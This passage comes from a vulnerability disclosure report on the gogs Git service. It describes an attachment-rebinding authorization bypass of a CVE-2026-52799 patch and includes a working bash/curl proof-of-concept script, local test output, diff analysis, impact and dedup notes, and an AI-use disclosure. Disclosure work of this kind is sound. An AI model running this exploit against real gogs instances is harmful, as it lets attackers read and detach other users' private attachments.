' -c '$jar' -b '$jar' '$BASE/repo/create' '${args[@]}' } echo 'STEP 0: register & login two accounts' reg_login '$VJ' victim victim@local.test 'VictimPass123!' reg_login '$AJ' attacker attacker@local.test 'AttackPass123!' echo 'STEP 1: victim creates a PRIVATE repo' create_repo '$VJ' 1 secretrepo on echo 'STEP 2: victim uploads an attachment -> obtains UUID' SECRET='INTERNAL-SECRET-DO-NOT-LEAK-$(date +%s)'; echo '$SECRET' > '$CT/secret.txt' UT=$(csrf '$VJ' /victim/secretrepo/issues/new) UP_JSON=$(curl -s -b '$VJ' -H 'X-Csrf-Token: $UT' -F '_csrf=$UT' -F 'file=@$CT/secret.txt;type=text/plain' '$BASE/issues/attachments') echo ' upload response: $UP_JSON' UUID=$(echo '$UP_JSON' | grep -oE ''uuid':'[^']*'' | sed -E 's/.*:'([^']*)'.*/\1/') echo 'STEP 3: victim attaches the file to an issue in the PRIVATE repo' IT=$(csrf '$VJ' /victim/secretrepo/issues/new) curl -s -o /dev/null -w ' victim new-issue -> HTTP %{http_code} loc=%{redirect_url}
' -c '$VJ' -b '$VJ' \ '$BASE/victim/secretrepo/issues/new' --data-urlencode '_csrf=$IT' --data-urlencode 'title=secret report' \ --data-urlencode 'content=see attachment' --data-urlencode 'files=$UUID' echo 'STEP 4: attacker (no access) tries to DOWNLOAD victim UUID directly (expect DENIED)' curl -s -o '$CT/a_before.bin' -w ' attacker GET /attachments/$UUID -> HTTP %{http_code} size=%{size_download}
' -b '$AJ' '$BASE/attachments/$UUID' echo 'STEP 5: attacker creates their OWN repo' create_repo '$AJ' 2 attackrepo '' echo 'STEP 6: attacker creates an issue in THEIR repo with files[]=victim UUID (the rebind)' RT=$(csrf '$AJ' /attacker/attackrepo/issues/new) curl -s -o /dev/null -w ' attacker new-issue(rebind) -> HTTP %{http_code} loc=%{redirect_url}
' -c '$AJ' -b '$AJ' \ '$BASE/attacker/attackrepo/issues/new' --data-urlencode '_csrf=$RT' --data-urlencode 'title=stolen' \ --data-urlencode 'content=rebinding victim attachment' --data-urlencode 'files=$UUID' echo 'STEP 7: attacker RE-tries download of the same UUID (expect NOW SUCCEEDS)' curl -s -o '$CT/a_after.bin' -w ' attacker GET /attachments/$UUID -> HTTP %{http_code} size=%{size_download}
' -b '$AJ' '$BASE/attachments/$UUID' echo ' downloaded content: $(cat '$CT/a_after.bin')'; echo ' expected secret : $SECRET' grep -q '$SECRET' '$CT/a_after.bin' && echo ' >>> BYPASS CONFIRMED <<<' || echo ' >>> no bypass <<<' echo 'STEP 8: integrity - is the file still on the victim's issue?' curl -s -b '$VJ' '$BASE/victim/secretrepo/issues/1' | grep -oE '/attachments/[0-9a-f-]+' | sort -u | sed 's/^/ /' || echo ' (none)' ``` Actual output (running gogs v0.14.3 instance): STEP 0: register & login two accounts [victim] logged-in check: 200 [attacker] logged-in check: 200 STEP 1: victim creates a PRIVATE repo create_repo(secretrepo) -> HTTP 302 loc=http://127.0.0.1:3200/victim/secretrepo STEP 2: victim uploads an attachment -> obtains UUID upload response: {'uuid':'86deab04-522a-47cd-9384-bbf36e4b6661'} victim attachment UUID = 86deab04-522a-47cd-9384-bbf36e4b6661 STEP 3: victim attaches the file to an issue in the PRIVATE repo victim new-issue -> HTTP 302 loc=http://127.0.0.1:3200/victim/secretrepo/issues/1 STEP 4: attacker (no access) tries to DOWNLOAD victim UUID directly (expected after p9f5 patch: DENIED) attacker GET /attachments/86deab04-522a-47cd-9384-bbf36e4b6661 -> HTTP 404 size=9512 body(first line): <!DOCTYPE html> STEP 5: attacker creates their OWN repo create_repo(attackrepo) -> HTTP 302 loc=http://127.0.0.1:3200/attacker/attackrepo STEP 6: attacker creates an issue in THEIR repo with files[]=victim UUID (the rebind) attacker new-issue(rebind) -> HTTP 302 loc=http://127.0.0.1:3200/attacker/attackrepo/issues/1 STEP 7: attacker RE-tries download of the same UUID (expected: NOW SUCCEEDS -> bypass) attacker GET /attachments/86deab04-522a-47cd-9384-bbf36e4b6661 -> HTTP 200 size=39 downloaded content: INTERNAL-SECRET-DO-NOT-LEAK-1791559636 expected secret : INTERNAL-SECRET-DO-NOT-LEAK-1791559636 >>> BYPASS CONFIRMED: attacker downloaded victim's private attachment <<< STEP 8: integrity impact - is the file still on the victim's issue? victim issue #1 page attachment link present?: (no output - the attachment link is no longer rendered on victim's issue #1 page) Key contrast (same UUID, same attacker session): - Before rebinding (STEP 4): `GET /attachments/<victim-uuid>` (attacker) -> HTTP 404 (p9f5 patch blocks correctly) - After rebinding (STEP 7): same `GET /attachments/<victim-uuid>` (attacker) -> HTTP 200 + private content (bypass succeeds) - Integrity (STEP 8): viewing victim issue #1 -> attachment link gone (file moved to attacker's issue) The fact that STEP 4's 404 and STEP 7's 200 diverge for the SAME attacker and SAME UUID is the decisive proof that 'the p9f5 patch is on, but it is bypassed via write-path rebinding.' PoC (C) - Independent re-reproduction by the submitter (human-run, separate session from the AI's run above) To remove any doubt that this is only an AI-generated claim, the human submitter independently rebuilt v0.14.3 from a fresh git worktree and re-ran the exact same two-account E2E attack on their own machine, on a separate occasion from the run captured in PoC (B). The only adjustment needed was adding ENABLE_REGISTRATION_CAPTCHA = false under [auth] in app.ini, because the vendor's default registration captcha (unrelated to this vulnerability) blocked the PoC's scripted sign-up; this is a test-harness accommodation, not part of the exploit. Environment: macOS 23.6.0 (arm64), Go 1.27.1, v0.14.3 built via `git worktree add`, SQLite backend, 127.0.0.1-only. Actual output (submitter's own run, independent of PoC (B)): STEP 1: victim creates a PRIVATE repo create_repo(secretrepo) -> HTTP 302 loc=http://127.0.0.1:3200/victim/secretrepo STEP 2: victim uploads an attachment -> obtains UUID upload response: {'uuid':'dc5a7a68-0dca-4b3a-975b-ff565b2ab048'} STEP 3: victim attaches the file to an issue in the PRIVATE repo victim new-issue -> HTTP 302 loc=http://127.0.0.1:3200/victim/secretrepo/issues/1 STEP 4: attacker (no access) tries to DOWNLOAD victim UUID directly attacker GET /attachments/dc5a7a68-0dca-4b3a-975b-ff565b2ab048 -> HTTP 404 size=9500 STEP 5: attacker creates their OWN repo create_repo(attackrepo) -> HTTP 302 loc=http://127.0.0.1:3200/attacker/attackrepo STEP 6: attacker creates an issue in THEIR repo with files[]=victim UUID (the rebind) attacker new-issue(rebind) -> HTTP 302 loc=http://127.0.0.1:3200/attacker/attackrepo/issues/1 STEP 7: attacker RE-tries download of the same UUID attacker GET /attachments/dc5a7a68-0dca-4b3a-975b-ff565b2ab048 -> HTTP 200 size=39 downloaded content: INTERNAL-SECRET-DO-NOT-LEAK-1791698691 expected secret : INTERNAL-SECRET-DO-NOT-LEAK-1791698691 >>> BYPASS CONFIRMED <<< This second, independently-run reproduction (different UUID, different secret value, different run) reaches the identical 404 -> 200 divergence as PoC (B), confirming the bypass is deterministic and not a one-off artifact. v0.14.3 vs main (dbbd717, 0.15.0+dev): main switched its frontend to a Vite SPA, so starting it at runtime requires an npm/vite build; the runtime E2E was therefore done on v0.14.3. Instead, the backend vulnerable handlers were confirmed identical to v0.14.3 by git diff: - getAttachmentsByUUIDs (internal/database/attachment.go): byte-identical v0.14.3 <-> main (e.In('uuid', uuids).Find(...), no owner/issue_id==0 filter). - newIssue rebinding loop (internal/database/issue.go): the only difference is a semantics-preserving micro-refactor for i := 0; i < len(attachments); i++ -> for i := range attachments. The unconditional overwrite is identical. - download handler: main cmd/gogs/internal/web/web.go:187-221 <-> v0.14.3 internal/cmd/web.go:306-345, same structure. - Attachment model: no uploader/owner column in main either. Since the Go functions this E2E drives are identical across both versions, the v0.14.3 runtime evidence holds for main as well. (Limitation: if triage requires a main-binary reproduction, additional repro needs npm install && vite build then go build -tags prod ./cmd/gogs, which requires approval for network npm access.) ### Impact Any authenticated registered user (anyone who can create their own repository), given knowledge of a victim's private attachment UUID: - Confidentiality (C:H): can download the victim's private-repo attachment file verbatim. The exact 'download a private attachment with only the UUID' threat that CVE-2026-52799 tried to block at 7.5 High is reinstated via one extra write-path rebinding step. - Integrity (I:L): the rebinding simultaneously detaches the attachment from the victim's issue/release and moves it to the attacker's object. From the victim's perspective this is data tampering/loss (the attachment disappears). - The same flaw exists not only in the issue path but also in the comment (comment.go) and release (release.go) creation paths, so the attack surface is not limited to a single endpoint. ### DEDUP Likelihood of a separate CVE: medium (~60%) (lowered by the skeptic from the verifier's initial ~75%). Arguments for a separate CVE: zero file/method overlap between the official patch (d3ca23f) and the residual locations (confirmed via the actual .patch diff); a new vector/impact distinct from the read-only GET missing-authorization, namely 'authenticated write forging object ownership + integrity (loss of the victim's attachment)'; deterministic reproduction; and gogs's precedent of issuing cross-repo write-side authorization bypasses as separate CVEs (GHSA-cv22 Label edit, GHSA-jj5m Comment delete, GHSA-rjv5 repo delete API). Absorption (duplicate) risk: the root cause (no owner column in the attachment model) and the precondition (prior knowledge of a 122-bit UUID) are the same as CVE-2026-52799, and that CVE is very recent (2026), so it is realistically possible the vendor fixes the write paths too (by introducing an owner concept for attachments) and absorbs this into p9f5 hardening (or an update to the existing advisory) without a separate ID. Both scenarios are realistic and are disclosed honestly to triage. ### AI USE DISCLOSURE This report was prepared with AI (Claude) assistance - used for source code analysis, call-path tracing, PoC scripting, and drafting the report. However, this is not static-scanner output. The reporter actually built and ran gogs v0.14.3 (the release announced as the CVE-2026-52799 fix) locally and executed the end-to-end attack scenario with two accounts (victim/attacker), TWICE on separate occasions (see PoC (B) and PoC (C) above, with different UUIDs/secrets, same result). For the same attacker and same UUID, the reporter observed with their own eyes HTTP 404 before rebinding (patch working correctly) and HTTP 200 + the victim's private attachment content after rebinding, and also observed the integrity impact of the attachment disappearing from the victim's issue. In addition, the reporter downloaded the actual .patch of the official fix commit (d3ca23f) to confirm the only changed file is the single download handler, and compared via git diff that the write-path code remains present in both v0.14.3 and main. The reporter understands the root cause directly (the structural flaw that the attachment model has no owner column, so authorization relies solely on reverse-resolving the rebindable IssueID) and can answer follow-up questions directly rather than pasting AI output verbatim.

